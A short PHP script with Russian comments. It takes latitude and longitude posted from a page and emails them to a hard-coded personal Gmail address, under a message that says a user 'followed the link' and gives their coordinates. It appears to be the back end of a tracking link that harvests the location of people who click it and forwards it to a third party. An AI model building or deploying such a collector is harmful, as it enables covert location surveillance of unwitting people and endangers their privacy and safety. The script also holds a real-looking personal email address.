<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $latitude = $_POST['latitude'];
    $longitude = $_POST['longitude'];
    
    // Адрес электронной почты, на который будут отправляться данные
    $to = "ptaknik@gmail.com";
    $subject = "Координаты пользователя";
    $message = "Пользователь перешел по ссылке. Его координаты:\nШирота: $latitude\nДолгота: $longitude";
    $headers = "From: no-reply@example.com";

    // Отправка письма
    if (mail($to, $subject, $message, $headers)) {
        echo "Данные отправлены успешно!";
    } else {
        echo "Ошибка при отправке данных.";
    }
} else {
    echo "Неправильный метод запроса.";
}
